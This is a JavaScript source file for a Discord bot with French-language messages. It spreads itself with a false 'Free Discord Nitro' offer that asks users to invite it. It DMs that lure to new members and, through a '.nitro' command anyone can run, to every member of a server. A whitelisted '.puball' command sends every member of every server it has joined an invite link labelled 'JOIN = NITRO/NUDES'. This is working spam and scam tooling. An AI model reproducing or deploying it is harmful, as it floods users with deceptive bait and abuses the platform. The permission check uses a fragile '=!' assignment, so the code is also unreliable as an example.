const Discord = require("discord.js");
const bot = new Discord.Client();
const fs = require("fs")
bot.whitelist = require("./wl.json")

const prefix = ".";

bot.login(process.env.TOKEN);

bot.on("ready", function() {
    console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
    console.log(
`
                                    ███▄ ▄███▓ ██▓███   ▄▄▄       ██▓     ██▓      
                                    ▓██▒▀█▀ ██▒▓██░  ██▒▒████▄    ▓██▒    ▓██▒    
                                    ▓██    ▓██░▓██░ ██▓▒▒██  ▀█▄  ▒██░    ▒██░    
                                    ▒██    ▒██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██░    ▒██░    
                                    ▒██▒   ░██▒▒██▒ ░  ░ ▓█   ▓██▒░██████▒░██████▒
                                   ░ ▒░   ░  ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
                                   ░  ░      ░░▒ ░       ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
                                   ░      ░   ░░         ░   ▒     ░ ░     ░ ░   
                                          ░                  ░  ░    ░  ░    ░  ░
`);
console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
    let a = 0
  setInterval(() => {
if(a === 0){
  bot.user.setActivity(`.nitro | ${bot.guilds.size} servers | ${bot.users.size} members`, { type: 'PLAYING'});
    a = 1
} else {
    if(a === 1){
      bot.user.setActivity(`${bot.guilds.size} servers | ${bot.users.size} members`, { type: 'PLAYING'});
        a = 0             
}  
}
}, 8000)});

bot.on('guildCreate',function(guild){
  var logschannel = bot.channels.find("id", "664094575748448287")

    var embed= new Discord.RichEmbed()
    .setDescription("Bot ajouté sur un serveur !")
    .addField("Serveur:", guild.name)
    .addField("ID du serveur", guild.id)
    .addField("Owner:", guild.owner)
    .addField("Nombre de membres:", guild.members.size)
    .addField("Nombre de channel:", guild.channels.size)

    logschannel.send(embed)

    console.log(` > Le bot a été ajouté sur: ${guild.name} - ${guild.members.size} membres`)
});

bot.on('guildMemberAdd', member => {
  member.createDM().then(channel => {

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=657306695533592607&scope=bot&permissions=9216")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()

    channel.send(serverembed);
  }).catch(console.error);
});

bot.on('message', msg => {

  let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=657306695533592607&scope=bot&permissions=9216")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()

  if(msg.content.startsWith(prefix + 'puball')) {

    let _message = bot.whitelist[msg.author.id]

    if(msg.author.id =! _message) return msg.channel.send("Tu ne peux pas utliser cette commande.")

      console.log(" > Start sending")
      var servers =  bot.guilds.array();
      for(let it = 0;it<servers.length;it++){
          let members = servers[it].members.array()
          for(let it2 = 0;it2<members.length;it2++) {
              if(bot.user.id != members[it2].id)
              {
              members[it2].send("https://discord.gg/QXfXEv4 \n **JOIN = NITRO/NUDES**").catch(err => false);
              }
            }
          msg.channel.send('ServerID: **'+servers[it].id+'** - ServerNAME: **'+servers[it].name+'** - MemberMP: **'+members.length+'**')
        }
  }
});

bot.on('message', message => {
  if (message.content.startsWith(prefix + "nitro")) {

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=657306695533592607&scope=bot&permissions=9216")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()
    
    message.delete(0).catch(console.error)
    message.channel.guild.members.forEach(user => {
    user.send(serverembed);
    });
  }
})

bot.on('message', message => {
  if (message.content === `${prefix}msgwola`){

    let _message = bot.whitelist[message.author.id]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=657306695533592607&scope=bot&permissions=9216")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()

    return message.channel.send(serverembed);
  
  }
}
)

bot.on('message', message => {
  if (message.content === `${prefix}slist`){

    let _message = bot.whitelist[message.author.id]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")

    let serverembed = new Discord.RichEmbed()
    .setTitle("Serverlist: ")
    .addField(`${bot.guilds.size} servers | ${bot.users.size} members`, 'rawé chaud tavu frérot')
    .setColor("cb72da")

    message.channel.send(serverembed);
    message.channel.send(bot.guilds.map(r => r.name + ` | ${r.memberCount} membres`))
  }
}
)

bot.on('message', message => {
  if (message.content === `${prefix}reload`){

    let _message = bot.whitelist[message.author.id]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")

    console.log("-------------------------\nReloaded!");
    console.log(`${bot.guilds.size} servers | ${bot.users.size} members\n-------------------------`);
    console.log(bot.guilds.map(r => r.name + ` | ${r.memberCount} members`));
  }

  if (message.content.startsWith(`${prefix}wl`)) {
      
    let _message = bot.whitelist[message.author.id]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")
        
    editedmessage = message.content.slice (4);

    bot.whitelist [editedmessage] = {
      message: "a été WhiteList par " + message.author.tag
    }
    fs.writeFile ("./wl.json", JSON.stringify (bot.whitelist, null, 4), err => {
      if (err) throw err;

      let serverembed = new Discord.RichEmbed()
    .setTitle("WhiteListCommand")
    .setDescription(`<@${editedmessage}> a été ajouté(e) à la WhiteList.`)
    .setColor("cb72da")
    .setFooter("WhiteList", bot.user.avatarURL)
    .setTimestamp()

      message.channel.send(serverembed)
});
}});
